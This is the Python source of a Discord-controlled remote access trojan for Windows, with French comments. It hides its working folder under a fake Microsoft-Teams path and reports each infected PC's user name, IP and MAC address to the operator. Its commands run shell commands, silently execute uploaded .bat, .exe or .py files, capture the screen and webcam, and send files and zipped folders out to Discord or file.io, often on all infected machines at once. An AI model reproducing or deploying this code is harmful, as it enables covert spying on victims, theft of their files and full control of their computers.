import sys
import discord
from discord.ext import commands
import os
import datetime
import subprocess
from datetime import datetime
import pyautogui
import traceback
import requests
import shutil
import asyncio
import ctypes
import cv2
import numpy as np
from PIL import Image
import io
import socket
import threading
import uuid
import tempfile

# Obtenir le nom d'utilisateur actuel
current_user = os.getlogin()

CAM_CHANNEL_ID = 1326872701616394250

# Cr√©er le chemin personnalis√© avec le nom d'utilisateur
custom_temp_dir = f"C:\\Users\\{current_user}\\AppData\\Local\\Microsoft-Teams\\temp"

# V√©rifier si le r√©pertoire existe, sinon le cr√©er
if not os.path.exists(custom_temp_dir):
    os.makedirs(custom_temp_dir)

# Rendre le dossier cach√© mais visible dans les fichiers masqu√©s
subprocess.run(['attrib', '+h', custom_temp_dir])


# Cr√©ation des intents
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.reactions = True
intents.guilds = True
intents.members = True
intents.presences = True

bot = commands.Bot(command_prefix="!", intents=intents)


# Supprimer la commande `help` par d√©faut
bot.remove_command('help')

# Stockage des PCs connect√©s
connected_pcs = {}



# Fonction pour obtenir un identifiant unique bas√© sur l'adresse MAC
def get_unique_pc_id():
    # Utilisation de l'adresse MAC comme identifiant unique
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)])
    return mac_address

@bot.command(name='install')
async def install(ctx, pc_id: str, target_path: str):
    """
    T√©l√©charge et installe un fichier joint sur un PC connect√© √† un emplacement sp√©cifi√©.
    """
    # Si l'ID est 'all', appliquer l'installation √† tous les PCs connect√©s
    if pc_id.lower() == 'all':
        if not connected_pcs:
            await ctx.send("> Aucun PC connect√© actuellement.")
            return

        # Appliquer l'installation √† chaque PC connect√©
        for current_pc_id in list(connected_pcs.keys()):
            await install_file_on_pc(ctx, current_pc_id, target_path)
        return  # Terminer la fonction apr√®s avoir ex√©cut√© sur tous les PCs

    # Si l'ID n'est pas 'all', v√©rifier si le PC est connect√©
    pc_info = connected_pcs.get(pc_id)
    if not pc_info:
        await ctx.send(f"> Aucun PC trouv√© avec l'ID {pc_id}.")
        return

    # Appliquer l'installation au PC sp√©cifique
    await install_file_on_pc(ctx, pc_id, target_path)


async def install_file_on_pc(ctx, pc_id: str, target_path: str):
    """
    Fonction auxiliaire pour installer un fichier sur un PC sp√©cifique.
    """
    # V√©rifier s'il y a une pi√®ce jointe
    if len(ctx.message.attachments) == 0:
        await ctx.send("> Aucune pi√®ce jointe trouv√©e. Veuillez joindre un fichier √† la commande.")
        return

    attachment = ctx.message.attachments[0]
    file_name = attachment.filename

    try:
        # Chemin temporaire pour t√©l√©charger le fichier (modifi√© pour utiliser custom_temp_dir)
        temp_path = os.path.join(custom_temp_dir, file_name)
        
        # T√©l√©charger la pi√®ce jointe
        await attachment.save(temp_path)
        await ctx.send(f"> Fichier {file_name} t√©l√©charg√© dans l'emplacement temporaire : {temp_path}.")

        # V√©rifier si le chemin cible inclut un nom de fichier
        if os.path.isdir(target_path):
            target_path = os.path.join(target_path, file_name)

        # Copier le fichier au chemin cible
        if not os.path.exists(os.path.dirname(target_path)):
            os.makedirs(os.path.dirname(target_path))  # Cr√©e le r√©pertoire si n√©cessaire

        os.replace(temp_path, target_path)
        await ctx.send(f"> Fichier {file_name} install√© avec succ√®s √† l'emplacement : {target_path}.")

    except Exception as e:
        await ctx.send(f"> Une erreur est survenue lors de l'installation du fichier : {e}")

    finally:
        # Nettoyer le r√©pertoire temporaire
        if os.path.exists(temp_path):
            os.remove(temp_path)

# Commande `cmd`
import subprocess

@bot.command(name='cmd')
async def cmd_command(ctx, id_pc: str, *, args):
    
    # Si l'ID est 'all', ex√©cuter la commande sur tous les PCs connect√©s
    if id_pc.lower() == 'all':
        if not connected_pcs:
            await ctx.send("> Aucun PC connect√© actuellement.")
            return

        # Ex√©cuter la commande sur chaque PC
        for current_pc_id in list(connected_pcs.keys()):
            await execute_cmd_on_pc(ctx, current_pc_id, args)

    else:
        # Si l'ID n'est pas 'all', v√©rifier que le PC existe
        if id_pc not in connected_pcs:
            await ctx.send(f"Le PC avec l'ID {id_pc} n'est pas connect√©.")
            return
        
        # Ex√©cuter la commande sur le PC sp√©cifique
        await execute_cmd_on_pc(ctx, id_pc, args)


async def execute_cmd_on_pc(ctx, pc_id: str, commande: str):
    """
    Fonction auxiliaire pour ex√©cuter une commande sur un PC sp√©cifique.
    """
    try:
        result = subprocess.run(commande, shell=True, capture_output=True, text=True)
        output = result.stdout

        # Si la sortie est trop longue, l'envoyer en plusieurs messages
        if output:
            max_length = 2000  # Limite de caract√®res par message
            # Tentative d'utilisation de l'encodage utf-8
            try:
                output = output.encode('utf-8', errors='replace').decode('utf-8')
            except UnicodeDecodeError:
                output = output.encode('cp1252', errors='replace').decode('cp1252')

            if len(output) > max_length:
                # Diviser la sortie en morceaux de taille max_length
                for i in range(0, len(output), max_length):
                    await ctx.send(f"R√©sultat de la commande ex√©cut√©e sur {pc_id} (partie {i//max_length + 1}):\n```\n{output[i:i+max_length]}\n```")
            else:
                await ctx.send(f"R√©sultat de la commande ex√©cut√©e sur {pc_id} :\n```\n{output}\n```")
        elif result.stderr:
            await ctx.send(f"Erreur lors de l'ex√©cution de la commande sur {pc_id} :\n```\n{result.stderr}\n```")
        else:
            await ctx.send(f"Aucun r√©sultat trouv√© pour la commande ex√©cut√©e sur {pc_id}.")

    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'ex√©cution de la commande sur {pc_id} : {str(e)}")

# Capture de l'√©cran et encodage vid√©o en temps r√©el
def capture_and_encode(output_path, duration, fps=30, resolution=(1280, 720)):
    """
    Capture l'√©cran en continu et encode en vid√©o.
    :param output_path: Chemin pour sauvegarder la vid√©o.
    :param duration: Dur√©e en secondes du flux vid√©o.
    :param fps: Nombre d'images par seconde.
    :param resolution: R√©solution souhait√©e pour la vid√©o (largeur, hauteur).
    """
    width, height = resolution

    # Initialise l'√©crivain vid√©o
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_writer = cv2.VideoWriter(output_path, fourcc, fps, (width, height))

    # Capture des frames pour la dur√©e sp√©cifi√©e
    for _ in range(int(duration * fps)):
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)

        # Redimensionne pour correspondre √† la r√©solution choisie
        frame = cv2.resize(frame, (width, height))
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)  # Convertit en format BGR pour OpenCV
        video_writer.write(frame)

    video_writer.release()


@bot.command()
async def cam(ctx, pc_id: str, duration: int):
    """
    Commande Discord pour capturer et diffuser un flux vid√©o continu dans un salon vocal/vid√©o.
    :param pc_id: ID du PC (non utilis√© pour l'instant, pr√©vu pour extension multi-PC).
    :param duration: Dur√©e en secondes pour le flux vid√©o.
    """
    # V√©rifie si la dur√©e est valide
    if duration <= 0:
        await ctx.send("Dur√©e invalide. Utilise une dur√©e sup√©rieure √† 0 secondes.")
        return

    # Recherche du salon vocal/vid√©o
    cam_channel = bot.get_channel(CAM_CHANNEL_ID)
    if cam_channel is None:
        await ctx.send("‚ùå Le salon vocal/vid√©o est introuvable.")
        return

    # Tente de faire rejoindre le bot dans le salon vocal
    await ctx.send("üö∂‚Äç‚ôÇÔ∏è Tentative de rejoindre le salon vocal...")
    voice_channel = cam_channel.guild.get_channel(CAM_CHANNEL_ID)
    if voice_channel is None:
        await ctx.send("‚ùå Impossible de rejoindre le salon vocal.")
        return

    # Connexion du bot au salon vocal
    if not voice_channel.guild.voice_client:
        await voice_channel.connect()
        await ctx.send(f"üé§ Bot rejoint le salon vocal : {voice_channel.name}")
    else:
        await ctx.send(f"üîä Bot d√©j√† dans un salon vocal : {voice_channel.name}")

    # Capture vid√©o continue en temps r√©el
    await ctx.send("üé• D√©but du flux vid√©o en direct...")
    
    # Ouvre la capture vid√©o
    screen_capture = cv2.VideoCapture(0)  # Utilisez l'index appropri√© pour l'√©cran ou la cam√©ra
    if not screen_capture.isOpened():
        await ctx.send("‚ùå Impossible de d√©marrer la capture vid√©o.")
        return

    # Capture et envoi de la vid√©o en temps r√©el
    start_time = datetime.now()
    while (datetime.now() - start_time).seconds < duration:
        ret, frame = screen_capture.read()
        if not ret:
            await ctx.send("‚ùå Erreur de capture de l'√©cran.")
            break

        # Convertir l'image captur√©e en format compatible pour l'envoi
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame_pil = Image.fromarray(frame)
        frame_bytes = io.BytesIO()
        frame_pil.save(frame_bytes, format='PNG')
        frame_bytes.seek(0)

        # Envoi de l'image captur√©e dans le salon vocal
        await cam_channel.send(file=discord.File(frame_bytes, 'cam_frame.png'))

        # Attente pour la prochaine image
        await asyncio.sleep(1 / 30)  # √Ä 30 FPS

    # D√©connexion apr√®s la fin de la diffusion
    await ctx.send("üì° Fin du flux vid√©o.")
    if voice_channel.guild.voice_client:
        await voice_channel.guild.voice_client.disconnect()
        await ctx.send(f"‚ùå Bot d√©connect√© du salon vocal : {voice_channel.name}")

        
@bot.command(name='popup')
async def popup(ctx, pc_id: str, type_message: str, *, message: str):
    """
    Envoie un message pop-up √† un PC ou √† tous les PCs connect√©s avec le type et le message sp√©cifi√©.
    """
    # Si l'ID est 'all', appliquer l'envoi du pop-up √† tous les PCs connect√©s
    if pc_id.lower() == 'all':
        if not connected_pcs:
            await ctx.send("> Aucun PC connect√© actuellement.")
            return

        # Appliquer l'envoi du pop-up √† chaque PC connect√©
        for current_pc_id in list(connected_pcs.keys()):
            await send_popup_to_pc(ctx, current_pc_id, type_message, message)
        return  # Terminer la fonction apr√®s avoir ex√©cut√© sur tous les PCs

    # Si l'ID n'est pas 'all', v√©rifier si le PC est connect√©
    pc_info = connected_pcs.get(pc_id)
    if not pc_info:
        await ctx.send(f"> Aucun PC trouv√© avec l'ID {pc_id}.")
        return

    # Appliquer l'envoi du pop-up au PC sp√©cifique
    await send_popup_to_pc(ctx, pc_id, type_message, message)


async def send_popup_to_pc(ctx, pc_id: str, type_message: str, message: str):
    """
    Fonction auxiliaire pour envoyer un message pop-up √† un PC sp√©cifique.
    """
    try:
        # D√©finir le type d'ic√¥ne pour la pop-up
        if type_message == "info":
            icon_type = 0x40  # Ic√¥ne d'information
        elif type_message == "warning":
            icon_type = 0x30  # Ic√¥ne d'avertissement
        elif type_message == "error":
            icon_type = 0x10  # Ic√¥ne d'erreur
        elif type_message == "question":
            icon_type = 0x20  # Ic√¥ne de question
        else:
            await ctx.send("> Type de message invalide. Utilise 'info', 'warning', 'error' ou 'question'.")
            return

        # Envoi du message pop-up
        await ctx.send(f"> Envoi du message pop-up √† {pc_id}: {message} avec le type {type_message}.")

        # Affichage de la pop-up avec le type sp√©cifi√©
        ctypes.windll.user32.MessageBoxW(0, message, "SPN ?", icon_type | 0x1)

    except Exception as e:
        await ctx.send(f"> Une erreur est survenue lors de l'envoi du pop-up √† {pc_id}: {e}")


@bot.command(name='help')
async def help_command(ctx):
    """
    Affiche une liste des commandes disponibles avec une description d√©taill√©e.
    """
    embed = discord.Embed(
        title="Aide du Bot Projet SPN",
        description="Commandes disponibles pour interagir avec le bot.",
        color=0x3498db
    )

    # Liste des commandes avec descriptions
    commandes = [
        ("!list", "Liste tous les PCs connect√©s avec leurs informations."),
        ("!capture <ID_PC> <nombre> <intervalle>", 
         "Prend des captures d'√©cran sur le PC sp√©cifi√© √† intervalle r√©gulier.\n"
         "Exemple : `!capture 00:1a:2b:3c:4d:5e 5 10s`"),
        ("!record <ID_PC> <dur√©e> <intervalle> <nombre>",
         "Enregistre des vid√©os de l'√©cran du PC sp√©cifi√©.\n"
         "Exemple : `!record 00:1a:2b:3c:4d:5e 10s 5s 3`"),
        ("!shutdown <ID_PC>", 
         "√âteint le PC sp√©cifi√©.\nExemple : `!shutdown 00:1a:2b:3c:4d:5e`"),
        ("!execute <ID_PC>", 
         "T√©l√©charge et ex√©cute un fichier joint sur le PC sp√©cifi√©.\n"
         "Exemple : `!execute 00:1a:2b:3c:4d:5e`"),
         ("!upload <ID_PC> <chemin_du_fichier>", 
         "R√©cup√®re un fichier d'un PC connect√© et l'envoie dans le canal 'r√©sultat'.\n"
         "Exemple : `!upload 00:1a:2b:3c:4d:5e \"C:\\user\\photo.png\"`"),
        ("!install <ID_PC> <chemin_cible>",
         "Installe un fichier joint sur un PC connect√© √† l'emplacement sp√©cifi√©.\n"
         "Exemple : `!install 00:1a:2b:3c:4d:5e C:\\Users\\Utilisateur\\Documents`"),
        ("!cmd <ID_PC> <commande>", 
         "Ex√©cute une commande sur le PC sp√©cifi√© et retourne le r√©sultat.\n"
         "Exemple : `!cmd 00:1a:2b:3c:4d:5e dir`"),
        ("!cam <PC_ID> <dur√©e>", 
         "Diffuse un flux vid√©o en direct de la cam√©ra du PC sp√©cifi√© dans un salon vocal/vid√©o.\n"
         "Exemple : `!cam 00:1a:2b:3c:4d:5e 30`"),
        ("!popup <ID_PC> <type> <message>",
         "Affiche une popup avec un message sur le PC sp√©cifi√©.\n"
         "Types : info, warning, error, question.\n"
         "Exemple : `!popup 00:1a:2b:3c:4d:5e info 'Bonjour !'`"),
        ("!help", "Affiche cette aide.")
    ]

    # Ajout des commandes dans l'embed
    for nom, description in commandes:
        embed.add_field(name=nom, value=description, inline=False)

    await ctx.send(embed=embed)

@bot.command(name='upload')
async def upload(ctx, pc_id: str, path: str):
    """
    R√©cup√®re un fichier ou un dossier sur un PC connect√© et l'envoie dans le canal 'r√©sultat'.
    Si un dossier est sp√©cifi√©, il sera compress√© en ZIP avant l'envoi.
    Si le fichier/dossier d√©passe 8 Mo, il sera t√©l√©charg√© sur file.io.
    """
    if pc_id.lower() == 'all':
        await ctx.send("> Cette commande ne peut √™tre utilis√©e qu'avec un PC sp√©cifique. Veuillez fournir un ID unique.")
        return

    # V√©rification si le chemin existe
    if not os.path.exists(path):
        await ctx.send(f"> Le chemin sp√©cifi√© '{path}' n'existe pas sur le PC {pc_id}.")
        return

    async def handle_upload():
        try:
            current_user = os.getlogin()  # R√©cup√®re le nom d'utilisateur
            temp_dir = f"C:\\Users\\{current_user}\\AppData\\Local\\Microsoft-Teams\\temp"

            # Si le chemin est un dossier, le compresser en ZIP
            if os.path.isdir(path):
                zip_path = os.path.join(temp_dir, f"{os.path.basename(path)}.zip")
                shutil.make_archive(zip_path.replace(".zip", ""), 'zip', path)
                file_to_send = zip_path
            else:
                file_to_send = path

            # V√©rification de la taille du fichier/dossier compress√© (en Mo)
            if os.path.isdir(file_to_send):
                raise Exception(f"'{file_to_send}' est un dossier, pas un fichier.")

            file_size = os.path.getsize(file_to_send) / (1024 * 1024)  # Taille en Mo
            if file_size > 8:
                # Si le fichier/dossier d√©passe 8 Mo, on le t√©l√©charge sur file.io
                await ctx.send(f"> Le fichier ou dossier '{path}' est trop gros. T√©l√©chargement sur file.io...")
                file_url = upload_to_fileio(file_to_send)
                if file_url:
                    await ctx.send(f"> Le fichier ou dossier a √©t√© t√©l√©charg√© avec succ√®s. Voici le lien de t√©l√©chargement : {file_url}")
                else:
                    await ctx.send("> Une erreur est survenue lors du t√©l√©chargement sur file.io.")
            else:
                # Si le fichier ou dossier est inf√©rieur √† 8 Mo, on l'envoie directement sur Discord
                await ctx.send(f"> R√©cup√©ration du fichier ou dossier '{path}' sur le PC {pc_id}...")
                resultat_channel_id = 1313197803337416774  # Remplacez par l'ID r√©el du canal 'r√©sultat'
                resultat_channel = bot.get_channel(resultat_channel_id)

                if not resultat_channel:
                    await ctx.send("> Le canal 'r√©sultat' est introuvable.")
                    return

                with open(file_to_send, 'rb') as file:
                    await resultat_channel.send(file=discord.File(file, os.path.basename(file_to_send)))
                await ctx.send(f"> Le fichier ou dossier '{path}' a √©t√© envoy√© avec succ√®s dans le canal 'r√©sultat'.")
        except Exception as e:
            error_message = traceback.format_exc()
            await ctx.send(f"> Une erreur est survenue lors de l'upload : {e}\nD√©tails : {error_message}")
        finally:
            # Nettoyage des fichiers temporaires
            if os.path.isdir(path) and os.path.exists(zip_path):
                os.remove(zip_path)

    try:
        # D√©marrage de l'upload avec un timeout de 300 secondes (5 minutes)
        await asyncio.wait_for(handle_upload(), timeout=300)
    except asyncio.TimeoutError:
        await ctx.send("> Le d√©lai maximum de 5 minutes pour l'upload a √©t√© d√©pass√©. L'upload a √©t√© annul√©.")
        restart_bot()

def upload_to_fileio(file_path):
    """
    T√©l√©charge un fichier sur file.io et retourne l'URL de t√©l√©chargement.
    """
    try:
        with open(file_path, 'rb') as file:
            response = requests.post("https://file.io", files={'file': file})

        if response.status_code == 200:
            return response.json().get('link')
        else:
            return None
    except Exception as e:
        print(f"Erreur lors de l'upload sur file.io : {e}")
        return None

def restart_bot():
    """
    Red√©marre le bot en fermant la session actuelle et en relan√ßant le script.
    """
    try:
        python = sys.executable
        script_path = os.path.abspath(__file__)
        print(f"Red√©marrage du script : {script_path}")
        os.execl(python, python, script_path)
    except Exception as e:
        print(f"Erreur lors du red√©marrage du bot : {e}")




# Commande `list`
@bot.command(name='list')
async def list_pcs(ctx):
    if connected_pcs:
        embed = discord.Embed(title="Liste des PCs connect√©s :", color=0x2ecc71)
        for pc_id, info in connected_pcs.items():
            embed.add_field(
                name=f"PC {pc_id}", 
                value=f"**Utilisateur :** {info['username']}\n**IP Publique :** {info['ip']}\n**Connect√© depuis :** {info['first_connection']}",
                inline=False
            )
        await ctx.send(embed=embed)
    else:
        await ctx.send("> Aucun PC connect√© pour le moment.")

# Commande `capture`
@bot.command(name='capture')
async def capture(ctx, pc_id: str, num_captures: int, interval: str):
    """
    Prend des captures d'√©cran sur un PC sp√©cifi√© ou sur tous les PCs connect√©s.
    """
    if pc_id.lower() == 'all':
        for current_pc_id in connected_pcs.keys():
            await capture_on_pc(ctx, current_pc_id, num_captures, interval)
        await ctx.send("> Captures d'√©cran prises sur tous les PCs connect√©s.")
    else:
        if pc_id not in connected_pcs:
            await ctx.send(f"> Aucun PC trouv√© avec l'ID {pc_id}.")
            return
        await capture_on_pc(ctx, pc_id, num_captures, interval)

async def capture_on_pc(ctx, pc_id, num_captures, interval):
    try:
        # Conversion de l'intervalle en secondes
        if interval.endswith('s'):  # Si l'intervalle est donn√© en secondes
            interval_seconds = int(interval[:-1])
        elif interval.endswith('m'):  # Si l'intervalle est donn√© en minutes
            interval_seconds = int(interval[:-1]) * 60
        else:
            await ctx.send(f"> L'intervalle pour {pc_id} doit se terminer par 's' (secondes) ou 'm' (minutes).")
            return

        # Canal pour envoyer les captures
        channel = bot.get_channel(1313197803337416774)  # Remplacer par l'ID r√©el du salon
        await ctx.send(f"> Prise de {num_captures} captures pour le PC {pc_id} toutes les {interval}.")

        for i in range(num_captures):
            screenshot = pyautogui.screenshot()  # Prendre une capture d'√©cran
            screenshot_path = os.path.join(tempfile.gettempdir(), f"capture_{pc_id.replace(':', '_')}_{i + 1}.png")  # Nom du fichier
            screenshot.save(screenshot_path)  # Enregistrer la capture

            # Envoyer la capture au salon Discord
            with open(screenshot_path, 'rb') as file:
                await channel.send(file=discord.File(file, screenshot_path))

            # Supprimer la capture apr√®s envoi
            os.remove(screenshot_path)

            # Attendre avant la capture suivante
            await asyncio.sleep(interval_seconds)

    except ValueError:
        await ctx.send(f"> Une erreur est survenue lors de la conversion de l'intervalle pour {pc_id}.")
    except Exception as e:
        await ctx.send(f"> Une erreur est survenue pour {pc_id} : {e}")
# Commande `record`
@bot.command(name='record')
async def record(ctx, pc_id: str, duration: str, interval: str, num_videos: int):
    """
    Enregistre des vid√©os de l'√©cran sur un PC sp√©cifi√© ou sur tous les PCs connect√©s.
    """
    if pc_id.lower() == 'all':
        for current_pc_id in connected_pcs.keys():
            await record_on_pc(ctx, current_pc_id, duration, interval, num_videos)
        await ctx.send("> Enregistrements vid√©o effectu√©s sur tous les PCs connect√©s.")
    else:
        if pc_id not in connected_pcs:
            await ctx.send(f"> Aucun PC trouv√© avec l'ID {pc_id}.")
            return
        await record_on_pc(ctx, pc_id, duration, interval, num_videos)

async def record_on_pc(ctx, pc_id, duration, interval, num_videos):
    try:
        # Conversion des dur√©es
        if duration.endswith('s'):
            duration_seconds = int(duration[:-1])
        elif duration.endswith('m'):
            duration_seconds = int(duration[:-1]) * 60
        else:
            await ctx.send(f"> La dur√©e pour {pc_id} doit se terminer par 's' (secondes) ou 'm' (minutes).")
            return

        if interval.endswith('s'):
            interval_seconds = int(interval[:-1])
        elif interval.endswith('m'):
            interval_seconds = int(interval[:-1]) * 60
        else:
            await ctx.send(f"> L'intervalle pour {pc_id} doit se terminer par 's' (secondes) ou 'm' (minutes).")
            return

        # Canal pour envoyer les vid√©os
        channel = bot.get_channel(1313197803337416774)  # Remplacer par l'ID r√©el du salon
        await ctx.send(f"> Enregistrement de {num_videos} vid√©os de l'√©cran pour le PC {pc_id}, d'une dur√©e de {duration} chacune, toutes les {interval}.")

        for video_index in range(num_videos):
            video_path = os.path.join(tempfile.gettempdir(), f"record_{pc_id.replace(':', '_')}_{video_index + 1}.avi")

            # Configuration vid√©o
            import cv2
            import numpy as np
            from datetime import datetime

            screen_width, screen_height = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'XVID')  # Codec pour AVI
            video = cv2.VideoWriter(video_path, fourcc, 20.0, (screen_width, screen_height))

            start_time = datetime.now()
            frames_written = 0  # Compteur d'images ajout√©es
            while (datetime.now() - start_time).seconds < duration_seconds:
                frame = pyautogui.screenshot()
                frame = np.array(frame)  # Convertir PIL -> NumPy
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)  # Couleur compatible OpenCV
                video.write(frame)
                frames_written += 1

            video.release()  # Lib√©rer le fichier vid√©o
            if frames_written == 0:
                await ctx.send(f"> Aucun frame ajout√© pour la vid√©o {video_index + 1}. Vid√©o non valide.")
                os.remove(video_path)
                continue

            # Envoyer la vid√©o sur Discord
            with open(video_path, 'rb') as file:
                await channel.send(file=discord.File(file, os.path.basename(video_path)))

            # Nettoyer les fichiers temporaires
            os.remove(video_path)

            # Pause entre les vid√©os
            await asyncio.sleep(interval_seconds)

        await ctx.send(f"> Enregistrement termin√© pour {pc_id}.")

    except ValueError:
        await ctx.send(f"> Une erreur est survenue lors de la conversion des param√®tres pour {pc_id}.")
    except Exception as e:
        await ctx.send(f"> Une erreur inattendue est survenue pour {pc_id} : {e}")
        
# Commande `shutdown`
@bot.command(name='shutdown')
async def shutdown(ctx, pc_id: str):
    if pc_id.lower() == 'all':
        # Iterate over a copy of the dictionary keys
        for current_pc_id in list(connected_pcs.keys()):
            # Ex√©cuter une action personnalis√©e avant l'arr√™t du PC
            await custom_action(ctx, current_pc_id)
            await ctx.send(f"> Arr√™t du PC {current_pc_id}...")
            del connected_pcs[current_pc_id]  # Retirer le PC de la liste des connect√©s
            await ctx.send(f"> PC {current_pc_id} √©teint.")
    else:
        if pc_id not in connected_pcs:
            await ctx.send(f"> Aucun PC trouv√© avec l'ID {pc_id}.")
            return
        
        # Ex√©cuter une action personnalis√©e avant l'arr√™t du PC
        await custom_action(ctx, pc_id)
        await ctx.send(f"> Arr√™t du PC {pc_id}...")
        del connected_pcs[pc_id]  # Retirer le PC de la liste des connect√©s
        await ctx.send(f"> PC {pc_id} √©teint.")

    # Fermer le bot apr√®s l'arr√™t des PCs
    await ctx.send("> Fermeture du bot...")
    await bot.close()

# Exemple de fonction pour une action personnalis√©e
async def custom_action(ctx, pc_id):
    # Ajouter ici les actions √† effectuer avant l'arr√™t du PC
    await ctx.send(f"> Action personnalis√©e pour le PC {pc_id} termin√©e.")


# Commande `execute`
import os
import subprocess
import tempfile

import os
import subprocess

@bot.command(name='execute')
async def execute(ctx, pc_id: str):
    if pc_id.lower() == 'all':
        # Si l'ID est 'all', traiter tous les PC connect√©s
        if not connected_pcs:
            await ctx.send("> Aucun PC connect√© actuellement.")
            return

        for current_pc_id in list(connected_pcs.keys()):
            await execute_on_pc(ctx, current_pc_id)
    else:
        # Si l'ID n'est pas 'all', v√©rifier que le PC existe
        pc_info = connected_pcs.get(pc_id)
        if not pc_info:
            await ctx.send(f"> Aucun PC trouv√© avec l'ID {pc_id}.")
            return

        # Ex√©cuter l'action sur le PC sp√©cifique
        await execute_on_pc(ctx, pc_id)

async def execute_on_pc(ctx, pc_id: str):
    # V√©rifier s'il y a une pi√®ce jointe
    if len(ctx.message.attachments) == 0:
        await ctx.send("> Aucune pi√®ce jointe trouv√©e. Veuillez joindre un fichier √† la commande.")
        return

    attachment = ctx.message.attachments[0]
    file_name = attachment.filename
    
    # Utilisation de tempfile pour cr√©er un dossier temporaire s√©curis√©
    with tempfile.TemporaryDirectory() as temp_dir:
        file_path = os.path.join(temp_dir, file_name)

        # T√©l√©charger la pi√®ce jointe dans le r√©pertoire temporaire
        await attachment.save(file_path)
        await ctx.send(f"> Fichier {file_name} t√©l√©charg√© dans le r√©pertoire temporaire sur {pc_id}.")

        # V√©rifier si le fichier a bien √©t√© t√©l√©charg√©
        if not os.path.exists(file_path):
            await ctx.send(f"> Erreur : le fichier {file_name} n'a pas √©t√© t√©l√©charg√© correctement sur {pc_id}.")
            return

        # V√©rifier et ex√©cuter les fichiers .bat, .exe, ou .py
        if file_name.endswith(".bat"):
            await ctx.send(f"> Installation et ex√©cution du fichier {file_name} sur {pc_id}...")
            try:
                subprocess.run([file_path], check=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                await ctx.send(f"> Fichier {file_name} install√© et ex√©cut√© avec succ√®s sur {pc_id}.")
            except Exception as e:
                await ctx.send(f"> Erreur lors de l'ex√©cution du fichier {file_name} sur {pc_id}: {str(e)}")

        elif file_name.endswith(".exe"):
            await ctx.send(f"> Ex√©cution du fichier ex√©cutable {file_name} sur {pc_id}...")
            try:
                subprocess.run([file_path], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                await ctx.send(f"> Fichier {file_name} ex√©cut√© avec succ√®s sur {pc_id}.")
            except Exception as e:
                await ctx.send(f"> Erreur lors de l'ex√©cution du fichier {file_name} sur {pc_id}: {str(e)}")

        elif file_name.endswith(".py"):
            await ctx.send(f"> Ex√©cution du script Python {file_name} sur {pc_id}...")
            try:
                subprocess.run(["python", file_path], check=True)
                await ctx.send(f"> Script Python {file_name} ex√©cut√© avec succ√®s sur {pc_id}.")
            except Exception as e:
                await ctx.send(f"> Erreur lors de l'ex√©cution du script Python {file_name} sur {pc_id}: {str(e)}")

        else:
            await ctx.send("> Le fichier t√©l√©charg√© n'est pas un fichier ex√©cutable valide (.bat, .exe, .py).")

    # Le r√©pertoire temporaire est automatiquement nettoy√© √† la fin de ce bloc
    await ctx.send(f"> Fichier {file_name} supprim√© apr√®s l'installation sur {pc_id}.")
    
@bot.event
async def on_ready():
    print(f"{bot.user} est connect√© √† Discord !")
    ip = socket.gethostbyname(socket.gethostname())
    username = os.getlogin()
    pc_id = get_unique_pc_id()  # Utilisation de l'adresse MAC pour obtenir un ID unique
    connected_pcs[pc_id] = {"ip": ip, "username": username, "first_connection": "juste maintenant"}
    channel = bot.get_channel(1313197733443534859)
    if channel:
        embed = discord.Embed(title="Nouveau PC connect√©", color=0x2ecc71)
        embed.add_field(name="PC ID", value=pc_id, inline=True)
        embed.add_field(name="Utilisateur", value=username, inline=True)
        embed.add_field(name="IP Publique", value=ip, inline=True)
        embed.set_footer(text="Connect√© depuis juste maintenant.")
        await channel.send(embed=embed)

# Lancer le bot
bot.run("TOKEN")  # Remplace "TON_TOKEN_ICI" par ton token r√©el